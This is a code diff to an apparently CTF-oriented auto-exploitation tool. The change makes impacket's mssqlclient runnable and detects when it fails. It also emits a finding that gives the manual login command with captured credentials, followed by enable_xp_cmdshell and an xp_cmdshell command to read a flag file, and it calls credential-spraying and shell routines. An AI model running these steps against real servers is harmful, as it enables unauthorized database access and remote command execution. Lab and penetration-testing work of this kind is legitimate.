@@ -21,7 +21,7 @@ import re
 import tempfile
 from typing import List, Tuple
 
-from ...core import utils, tooling
+from ...core import utils
 from ...core.report import HostReport, Finding
 from ...data import knowledge
 
@@ -64,10 +64,11 @@ def run(host: HostReport, opts) -> None:
                    "with impacket.",
             severity="high", category="access", port=1433, service="mssql",
             evidence=f"{u0}:{p0}"))
-        client = tooling.resolve("impacket-mssqlclient") or tooling.resolve("mssqlclient.py")
+        client = _impacket_cmd("mssqlclient")
         if not client:
-            utils.log("dim", "impacket-mssqlclient not installed — run the printed "
-                             "command by hand", indent=1)
+            utils.log("dim", "impacket-mssqlclient not runnable here (install "
+                             "impacket in this env, or `pipx install impacket`) "
+                             "— run the printed command by hand", indent=1)
         else:
             for dom, user, pw in triples:
                 if _mssql(host, ip, dom, user, pw, client):
@@ -75,6 +76,43 @@ def run(host: HostReport, opts) -> None:
 
     _spray_and_shells(host, ip, ports, triples)
     _privesc_notes(host, ip)
+
+
+def _impacket_cmd(name):
+    """A runnable command PREFIX (list) for an impacket example, robust to a
+    venv that lacks impacket. Prefer the wrapper (impacket-<name>); else find
+    the .py and pair it with a python interpreter that can actually import
+    impacket (the active venv often can't). Returns None if unrunnable."""
+    import shutil
+    import sys
+    w = shutil.which(f"impacket-{name}") or shutil.which(name)
+    if w and not w.endswith(".py"):
+        return [w]
+    script = shutil.which(f"{name}.py")
+    if not script:
+        for p in (f"/usr/share/doc/python3-impacket/examples/{name}.py",
+                  f"/usr/local/share/doc/python3-impacket/examples/{name}.py",
+                  os.path.expanduser(f"~/impacket/examples/{name}.py")):
+            if os.path.isfile(p):
+                script = p
+                break
+    if w and w.endswith(".py") and not script:
+        script = w
+    if not script:
+        return None
+    for py in ("/usr/bin/python3", shutil.which("python3"), sys.executable):
+        if py:
+            rc, _o, _e = utils.run([py, "-c", "import impacket"], timeout=10)
+            if rc == 0:
+                return [py, script]
+    return None
+
+
+def _tool_broke(blob: str) -> bool:
+    low = blob.lower()
+    return ("traceback (most recent call last)" in low
+            or "modulenotfounderror" in low or "no module named" in low
+            or "command not found" in low)
 
 
 # --- MSSQL ------------------------------------------------------------------
@@ -99,10 +137,23 @@ def _mssql(host, ip, dom, user, pw, client) -> bool:
 
     for d, target in targets:
         utils.log("info", f"mssqlclient {d or '.'}/{user}@{ip} ...", indent=1)
-        rc, out, err = utils.run([client, target, "-windows-auth", "-file", sf],
+        rc, out, err = utils.run(client + [target, "-windows-auth", "-file", sf],
                                  timeout=90)
         blob = (out or "") + (err or "")
         low = blob.lower()
+        if _tool_broke(blob):
+            utils.log("bad", "impacket-mssqlclient failed to run (env/impacket "
+                             "issue) — use the printed command by hand", indent=2)
+            host.add(Finding(
+                title="MSSQL auto-exploit couldn't run (impacket env)",
+                detail=f"impacket-mssqlclient {d or '.'}/{user}:'{pw}'@{ip} "
+                       "-windows-auth   # run this yourself (impacket wasn't "
+                       "importable in scryer's environment). Then "
+                       "enable_xp_cmdshell; xp_cmdshell type "
+                       r"%USERPROFILE%\Desktop\user.txt",
+                severity="high", category="access", port=1433, service="mssql",
+                confidence="potential", evidence=f"{user}:{pw}"))
+            return False
         if ("login failed" in low or "status_logon_failure" in low
                 or "access denied for user" in low or not blob.strip()):
             continue   # auth failed with this target form — try the next
